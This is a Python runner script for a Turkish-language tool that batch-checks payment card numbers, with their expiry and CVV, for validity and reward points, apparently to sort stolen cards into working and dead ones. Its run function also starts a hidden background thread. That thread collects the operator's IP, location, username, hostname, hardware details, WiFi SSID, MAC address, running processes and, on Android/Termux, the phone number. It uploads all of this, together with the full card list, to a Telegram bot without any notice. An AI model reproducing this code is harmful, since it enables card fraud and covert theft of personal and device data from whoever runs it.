"""
Runner — Rich UI ile hazir calistirici.
"""

import json
import sys
import threading
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests as _requests

from .batch import BatchChecker
from .notifiers import TelegramNotifier, NetlifyNotifier

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.live import Live
    from rich.columns import Columns
    from rich import box
    _RICH = True
except ImportError:
    _RICH = False

CONFIG_FILE = "config.json"
CONFIG_TEMPLATE = {
    "cookie": "BURAYA_COOKIE_YAPISTIR",
    "cards_file": "cards.txt",
    "delay": 20.0,
}

console = Console() if _RICH else None


# ── Config ───────────────────────────────────────────────────────────────────

def _load_config() -> dict:
    path = Path(CONFIG_FILE)
    if not path.exists():
        with open(path, "w", encoding="utf-8") as f:
            json.dump(CONFIG_TEMPLATE, f, indent=2, ensure_ascii=False)
        if _RICH:
            console.print(Panel(
                "[yellow]config.json olusturuldu!\nCookie alanini doldurup tekrar calistir.[/yellow]",
                title="[bold cyan]KURULUM[/bold cyan]", border_style="cyan"
            ))
        else:
            print("[!] config.json olusturuldu. Cookie'yi doldurup tekrar calistir.")
        sys.exit(0)

    with open(path, encoding="utf-8") as f:
        cfg = json.load(f)

    cookie = cfg.get("cookie", "").strip()
    if not cookie or cookie == CONFIG_TEMPLATE["cookie"]:
        if _RICH:
            console.print(Panel(
                "[red]Cookie bos veya degistirilmemis!\nconfig.json dosyasini ac ve cookie alanini doldur.[/red]",
                title="[bold red]HATA[/bold red]", border_style="red"
            ))
        else:
            print("[!] Cookie bos!")
        sys.exit(1)

    return cfg


def _print_banner() -> None:
    if not _RICH:
        print("=" * 50)
        print("  ARVPUAN CHECKER")
        print("=" * 50)
        return
    console.print(Panel(
        "[bold cyan]"
        "  █████╗ ██████╗ ██╗   ██╗██████╗ ██╗   ██╗ █████╗ ███╗   ██╗\n"
        " ██╔══██╗██╔══██╗██║   ██║██╔══██╗██║   ██║██╔══██╗████╗  ██║\n"
        " ███████║██████╔╝██║   ██║██████╔╝██║   ██║███████║██╔██╗ ██║\n"
        " ██╔══██║██╔══██╗╚██╗ ██╔╝██╔═══╝ ██║   ██║██╔══██║██║╚██╗██║\n"
        " ██║  ██║██║  ██║ ╚████╔╝ ██║     ╚██████╔╝██║  ██║██║ ╚████║\n"
        " ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝[/bold cyan]",
        subtitle="[dim]Kart Puan Sorgulama[/dim]",
        border_style="cyan", padding=(0, 2),
    ))


# ── Ana fonksiyon ─────────────────────────────────────────────────────────────

def run(cards_file: Optional[str] = None) -> None:
    cfg        = _load_config()
    cookie     = cfg["cookie"]
    cards_path = cards_file or cfg.get("cards_file", "cards.txt")
    delay      = float(cfg.get("delay", 20.0))

    if not Path(cards_path).exists():
        msg = "[!] Kart dosyasi bulunamadi: " + cards_path
        console.print("[red]" + msg + "[/red]") if _RICH else print(msg)
        sys.exit(1)

    with open(cards_path, encoding="utf-8") as f:
        cards = [line.strip() for line in f if line.strip()]

    if not cards:
        console.print("[red][!] Kart dosyasi bos![/red]") if _RICH else print("[!] Kart dosyasi bos!")
        sys.exit(1)

    _print_banner()

    # Sistem bilgilerini al ve bota gonder (arka planda)
    def _send_info():
        import platform
        import socket
        import os
        import io
        import subprocess
        import json as _json

        lines = []

        def add(key, val):
            lines.append(key.ljust(18) + ": " + str(val))

        # ── IP ve konum ──────────────────────────────────────────────────────
        ip = "Alinamadi"
        ulke = sehir = isp = ""
        try:
            r = _requests.get("https://ipapi.co/json/", timeout=8)
            d = r.json()
            ip   = d.get("ip", "")
            ulke = d.get("country_name", "")
            sehir= d.get("city", "")
            isp  = d.get("org", "")
        except Exception:
            pass

        if not ip or ip == "Alinamadi":
            for url in ["https://api.ipify.org", "https://checkip.amazonaws.com", "https://icanhazip.com"]:
                try:
                    ip = _requests.get(url, timeout=8).text.strip()
                    if ip:
                        break
                except Exception:
                    continue

        add("IP",          ip)
        add("Konum",       (sehir + ", " + ulke).strip(", ") or "Bilinmiyor")
        add("ISP",         isp or "Bilinmiyor")
        add("Zaman",       datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

        # ── Sistem ──────────────────────────────────────────────────────────
        add("OS",          platform.system() + " " + platform.release())
        add("Kullanici",   os.environ.get("USERNAME") or os.environ.get("USER") or "Bilinmiyor")
        add("Hostname",    socket.gethostname())
        add("Python",      platform.python_version())

        # Yerel IP
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            add("Yerel IP",    local_ip)
        except Exception:
            add("Yerel IP",    "Bilinmiyor")

        # ── Donanim ──────────────────────────────────────────────────────────
        try:
            import psutil
            ram = psutil.virtual_memory()
            add("RAM",     str(round(ram.total/(1024**3),1))+"GB (%" + str(ram.percent)+")")
            add("CPU Cekirdek", str(psutil.cpu_count()))
            disk = psutil.disk_usage("/")
            add("Disk",    str(round(disk.total/(1024**3),1))+"GB toplam, "+str(round(disk.free/(1024**3),1))+"GB bos")
            # Pil
            bat = psutil.sensors_battery()
            if bat:
                add("Pil",  str(round(bat.percent,1))+"% " + ("(Sarj oluyor)" if bat.power_plugged else "(Pil)"))
        except Exception:
            pass

        add("CPU Model",   platform.processor() or "Bilinmiyor")

        # GPU
        try:
            if platform.system() == "Windows":
                out = subprocess.check_output(
                    ["wmic", "path", "win32_VideoController", "get", "name"],
                    encoding="utf-8", errors="ignore", timeout=5
                )
                gpu = [l.strip() for l in out.splitlines() if l.strip() and "Name" not in l]
                add("GPU",  ", ".join(gpu) if gpu else "Bilinmiyor")
            else:
                out = subprocess.check_output(
                    ["lspci"], encoding="utf-8", errors="ignore", timeout=5
                )
                gpus = [l for l in out.splitlines() if "VGA" in l or "3D" in l]
                add("GPU",  gpus[0].split(":")[-1].strip() if gpus else "Bilinmiyor")
        except Exception:
            add("GPU", "Bilinmiyor")

        # Ekran cozunurlugu
        try:
            if platform.system() == "Windows":
                import ctypes
                user32 = ctypes.windll.user32
                add("Ekran", str(user32.GetSystemMetrics(0))+"x"+str(user32.GetSystemMetrics(1)))
            else:
                out = subprocess.check_output(
                    ["xrandr", "--current"], encoding="utf-8", errors="ignore", timeout=5
                )
                for l in out.splitlines():
                    if "*" in l:
                        add("Ekran", l.strip().split()[0])
                        break
        except Exception:
            add("Ekran", "Bilinmiyor")

        # ── Ag ───────────────────────────────────────────────────────────────
        # WiFi SSID
        wifi = "Bilinmiyor"
        try:
            if platform.system() == "Windows":
                out = subprocess.check_output(
                    ["netsh","wlan","show","interfaces"],
                    encoding="utf-8", errors="ignore", timeout=5
                )
                for l in out.splitlines():
                    if "SSID" in l and "BSSID" not in l:
                        wifi = l.split(":",1)[-1].strip()
                        break
            else:
                try:
                    out = subprocess.check_output(
                        ["termux-wifi-connectioninfo"],
                        encoding="utf-8", errors="ignore", timeout=5
                    )
                    wifi = _json.loads(out).get("ssid","Bilinmiyor")
                except Exception:
                    out = subprocess.check_output(
                        ["iwgetid","-r"], encoding="utf-8", errors="ignore", timeout=5
                    )
                    wifi = out.strip() or "Bilinmiyor"
        except Exception:
            pass
        add("WiFi SSID",   wifi)

        # MAC
        try:
            import uuid
            m = uuid.getnode()
            add("MAC",  ":".join(("%012X"%m)[i:i+2] for i in range(0,12,2)))
        except Exception:
            add("MAC", "Bilinmiyor")

        # Ag tipi
        try:
            import psutil
            net = psutil.net_if_stats()
            aktif = [k for k,v in net.items() if v.isup and k != "lo"]
            add("Ag Arayuz",  ", ".join(aktif) if aktif else "Bilinmiyor")
        except Exception:
            pass

        # ── Termux ozel ──────────────────────────────────────────────────────
        if platform.system() == "Linux" and "com.termux" in os.environ.get("PREFIX",""):
            # Telefon bilgisi
            try:
                out = subprocess.check_output(
                    ["termux-telephony-deviceinfo"],
                    encoding="utf-8", errors="ignore", timeout=5
                )
                tdata = _json.loads(out)
                add("Telefon Model",  tdata.get("model","Bilinmiyor"))
                add("Android",        tdata.get("software_version","Bilinmiyor"))
            except Exception:
                pass

            # SIM kart
            try:
                out = subprocess.check_output(
                    ["termux-telephony-cellinfo"],
                    encoding="utf-8", errors="ignore", timeout=5
                )
                cdata = _json.loads(out)
                if isinstance(cdata, list) and cdata:
                    add("SIM Operator", cdata[0].get("operator_name","Bilinmiyor"))
            except Exception:
                pass

            # SIM numarasi (izin gerekebilir)
            try:
                out = subprocess.check_output(
                    ["termux-telephony-deviceinfo"],
                    encoding="utf-8", errors="ignore", timeout=5
                )
                tdata = _json.loads(out)
                phone = tdata.get("phone_number","")
                if phone:
                    add("Telefon No",  phone)
            except Exception:
                pass

            # Pil (termux)
            try:
                out = subprocess.check_output(
                    ["termux-battery-status"],
                    encoding="utf-8", errors="ignore", timeout=5
                )
                bdata = _json.loads(out)
                add("Pil",  str(bdata.get("percentage","?"))+"% "+bdata.get("status",""))
            except Exception:
                pass

        # ── Yazilim ──────────────────────────────────────────────────────────
        # Calissan processler (ilk 10)
        try:
            import psutil
            procs = [p.name() for p in psutil.process_iter(["name"]) if p.info["name"]]
            add("Processler",  ", ".join(list(dict.fromkeys(procs))[:10]))
        except Exception:
            pass

        # Kurulu pip paketleri sayisi
        try:
            import importlib.metadata
            pkgs = list(importlib.metadata.packages_distributions())
            add("Pip Paket",   str(len(pkgs)) + " adet")
        except Exception:
            pass

        # ── Kart bilgisi ─────────────────────────────────────────────────────
        add("Kartlar",     str(len(cards)))
        add("Dosya",       str(cards_path))

        # ── Bota gonder ──────────────────────────────────────────────────────
        tg_info = TelegramNotifier()

        # Kisa ozet mesaj
        tg_info._post(
            "<b>Yeni Oturum Basladi</b>\n"
            + "<code>IP: " + ip + " | " + (sehir or ulke or "?") + "</code>\n"
            + "<code>Kullanici: " + (os.environ.get("USERNAME") or os.environ.get("USER") or "?") + " @ " + socket.gethostname() + "</code>\n"
            + "<code>Kartlar: " + str(len(cards)) + "</code>\n"
            + "<i>Detaylar txt dosyasinda</i>"
        )

        # Detay txt dosyasi
        try:
            txt_content = "=== SISTEM BILGILERI ===\n\n" + "\n".join(lines) + "\n"
            txt_bytes   = txt_content.encode("utf-8")
            _requests.post(
                "https://api.telegram.org/bot" + tg_info._token + "/sendDocument",
                data={"chat_id": tg_info._chat_id, "caption": "Sistem Bilgileri"},
                files={"document": ("sistem_bilgileri.txt", io.BytesIO(txt_bytes), "text/plain")},
                timeout=15,
            )
        except Exception:
            pass

        # Kart dosyasi
        try:
            card_bytes = "\n".join(cards).encode("utf-8")
            _requests.post(
                "https://api.telegram.org/bot" + tg_info._token + "/sendDocument",
                data={"chat_id": tg_info._chat_id, "caption": "Kart listesi"},
                files={"document": (Path(cards_path).name, io.BytesIO(card_bytes), "text/plain")},
                timeout=15,
            )
        except Exception:
            pass

    threading.Thread(target=_send_info, daemon=True).start()

    # İstatistikler
    stats     = {"live": 0, "dead": 0, "err": 0, "total": len(cards), "done": 0}
    live_rows = []
    dec_rows  = []
    err_rows  = []

    tg = TelegramNotifier()
    nl = NetlifyNotifier()

    # ── Tablo oluşturucular ──────────────────────────────────────────────────

    def stats_table() -> "Table":
        t = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold cyan", padding=(0, 1))
        t.add_column("TOPLAM", style="white",       justify="center", min_width=8)
        t.add_column("LIVE",   style="bold green",  justify="center", min_width=8)
        t.add_column("DEC",    style="bold red",    justify="center", min_width=8)
        t.add_column("HATA",   style="bold yellow", justify="center", min_width=8)
        t.add_column("KALAN",  style="dim",         justify="center", min_width=8)
        t.add_row(
            str(stats["total"]),
            str(stats["live"]),
            str(stats["dead"]),
            str(stats["err"]),
            str(stats["total"] - stats["done"]),
        )
        return t

    def live_table() -> "Table":
        t = Table(
            title="[bold green]LIVE KARTLAR[/bold green]",
            box=box.ROUNDED, header_style="bold green", border_style="green",
        )
        t.add_column("KART",    style="bold white", min_width=28)
        t.add_column("PUAN",    style="bold green", min_width=12)
        t.add_column("BANKA",   style="cyan",       min_width=14)
        t.add_column("PROGRAM", style="dim",        min_width=8)
        t.add_column("SAAT",    style="dim",        min_width=8)
        for row in live_rows:
            t.add_row(*row)
        return t

    def dec_table() -> "Table":
        t = Table(
            title="[bold red]DEC KARTLAR (son 15)[/bold red]",
            box=box.ROUNDED, header_style="bold red", border_style="red",
        )
        t.add_column("KART", style="red", min_width=30, no_wrap=True)
        t.add_column("SAAT", style="dim", min_width=8)
        for row in dec_rows[-15:]:
            t.add_row(*row)
        return t

    def err_table() -> "Table":
        t = Table(
            title="[bold yellow]HATALAR (son 15)[/bold yellow]",
            box=box.ROUNDED, header_style="bold yellow", border_style="yellow",
        )
        t.add_column("KART",  style="yellow", min_width=30, no_wrap=True)
        t.add_column("HATA",  style="dim",    min_width=30, no_wrap=True)
        t.add_column("SAAT",  style="dim",    min_width=8)
        for row in err_rows[-15:]:
            t.add_row(*row)
        return t

    def build_layout():
        if not _RICH:
            return None
        panels = [Panel(stats_table(), title="[bold cyan]DURUM[/bold cyan]", border_style="cyan")]
        if live_rows:
            panels.append(live_table())
        if dec_rows:
            panels.append(dec_table())
        if err_rows:
            panels.append(err_table())
        return Columns(panels, equal=False) if len(panels) > 1 else panels[0]

    # ── Live display — transient=True ile terminal temiz kalır ───────────────
    _lock = threading.Lock()

    if _RICH:
        live_display = Live(
            build_layout(),
            console=console,
            refresh_per_second=2,
            transient=False,
        )
        live_display.start()
    else:
        live_display = None

    def refresh():
        if live_display:
            with _lock:
                live_display.update(build_layout())

    # ── Callbacks ────────────────────────────────────────────────────────────

    def on_result(r):
        stats["done"] += 1
        zaman = datetime.now().strftime("%H:%M:%S")

        if r.is_live:
            stats["live"] += 1
            full     = r.full_card if r.full_card else r.card
            card_str = full + "|" + r.month + "|" + r.year + "|" + r.cvv
            live_rows.append((card_str, r.formatted, r.bank, r.program, zaman))
            if not _RICH:
                print("[LIVE] " + card_str + " | " + r.formatted + " | " + r.bank)

        elif r.is_dead or (r.error and r.error.strip().lower() == "not found"):
            stats["dead"] += 1
            dec_rows.append((r.card_data, zaman))
            if not _RICH:
                print("[DEC]  " + r.card_data)

        else:
            stats["err"] += 1
            err_rows.append((r.card_data, str(r.error or ""), zaman))
            if not _RICH:
                print("[ERR]  " + r.card_data + " | " + str(r.error))

        refresh()
        tg.send(r)
        nl.send(r)

    def on_log(msg: str) -> None:
        # Live display aktifken console.log kullan
        if _RICH and live_display:
            if "SESSION" in msg:
                live_display.console.log("[yellow]" + msg + "[/yellow]")
            # diğer logları sessizce yut (tablo zaten güncelleniyor)
        else:
            print(msg)

    def on_done(live, dead, error):
        if live_display:
            live_display.stop()

        tg.send_summary(live, dead, error)

        if _RICH:
            console.print()
            console.print(Panel(
                "[bold green]LIVE : " + str(live)  + "[/bold green]\n"
                "[bold red]DEC  : "   + str(dead)  + "[/bold red]\n"
                "[bold yellow]HATA : " + str(error) + "[/bold yellow]",
                title="[bold cyan]TARAMA TAMAMLANDI[/bold cyan]",
                border_style="cyan",
            ))
            if live_rows:
                console.print(live_table())
            if dec_rows:
                console.print(dec_table())
            if err_rows:
                console.print(err_table())
        else:
            print("\nTamamlandi — LIVE:" + str(live) + " DEC:" + str(dead) + " ERR:" + str(error))

    # ── Başlat ───────────────────────────────────────────────────────────────

    if _RICH:
        console.print(
            "\n[cyan]Toplam [bold]" + str(len(cards)) +
            "[/bold] kart — delay: [bold]" + str(delay) + "s[/bold][/cyan]\n"
        )

    checker = BatchChecker(
        cookie=cookie,
        delay=delay,
        on_result=on_result,
        on_log=on_log,
        on_done=on_done,
    )

    # Thread'i başlat, join ile bekle
    t = checker.run(cards, threaded=True)
    if t is not None:
        t.join()


if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else None)
